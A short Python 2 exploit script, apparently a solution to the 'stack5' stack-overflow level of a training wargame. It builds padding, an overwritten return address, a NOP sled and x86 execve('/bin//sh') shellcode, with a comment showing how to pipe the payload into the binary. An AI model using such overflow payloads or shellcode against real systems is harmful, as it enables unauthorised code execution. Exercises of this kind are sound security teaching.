#!/usr/bin/python

from struct import pack as p 

#using cat to keep pipes open
#(python /tmp/exploit.py ; cat) | ./stack5

shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80" 
sled = "\x90" * (76 - len(shellcode))
eip = p("I",0xbffff7c0) 
pad = "A" * 76
all = pad + eip + sled + shellcode

print all
